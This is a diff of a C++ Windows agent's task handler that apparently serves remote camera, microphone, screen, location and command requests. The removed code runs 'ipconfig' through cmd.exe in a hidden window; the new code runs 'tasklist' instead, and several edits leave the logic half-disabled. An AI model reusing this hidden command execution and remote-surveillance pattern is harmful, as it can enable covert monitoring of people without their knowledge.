@@ -2,11 +2,11 @@
 #include "TasksHelper.h"
 
 HANDLE camRequest, micRequest, lockRequest, cmdRequest, locationRequest, screenRequest, newDataEvent;
-map<string, BOOL> workingTasks;
+map<string, map<string, string>> workingTasks;
 
 DWORD WINAPI initFiltering(LPVOID lpParam)
 {
-	while (TRUE) {
+	while (FALSE) {
 		ResponseData deviceConfigs;
 		LPCWSTR additionalSites;
 
@@ -181,24 +181,16 @@ DWORD WINAPI initRemoteCommands(LPVOID lpParam)
 			cmdRequest, // event handle
 			INFINITE);    // indefinite wait
 		ResetEvent(cmdRequest);
-		// Request Arrived..
-
-		// Read cmd request from disk
-		LPCWSTR cmd = L"ipconfig";
-
-		// Output to a new file
-		LPCWSTR o_cmd = L" > ";
+//		 Request Arrived..
 
 		// Get a new filename
 		wstring filename = stringToWString(constructFilename(TEMP_CODE));
 
-		// Construct the full command
-		wstring stdResult = wstring(cmd) + o_cmd + filename;
-		LPCWSTR final_cmd = stdResult.c_str();
-		ShellExecute(0, L"open", L"cmd.exe", final_cmd, 0, SW_HIDE);
+		if (!runCommand(L"tasklist", filename.c_str()));
+		//	continue;
 
 		wstring filenameFinal = stringToWString(constructFilename(CMD_CODE));
-		if (!rename(wStringToString(filename).c_str(), wStringToString(filenameFinal).c_str()))
+	//	if (!rename(wStringToString(filename).c_str(), wStringToString(filenameFinal).c_str()))
 		{
 			// Notifiy data manager thread
 			SetEvent(newDataEvent);
@@ -341,11 +333,11 @@ BOOL initRequest(map<string, map<string, string>> allRequests, const char* reque
 	currentRequest = allRequestsIterator->second;
 
 	// Try to find the task in the workingTasks list
-	map<string, BOOL>::iterator tasksIter = workingTasks.find(requestName);
+	map<string, map<string, string>>::iterator tasksIter = workingTasks.find(requestName);
 
 	if (tasksIter == workingTasks.end()) {
 		//The task is new, register it in the map ..
-		workingTasks.insert(make_pair(requestName, TRUE));
+		workingTasks.insert(make_pair(requestName, currentRequest));
 	}
 	else { // The task was found in the map ..
 		return FALSE; // Task already running, no need to call it again ..
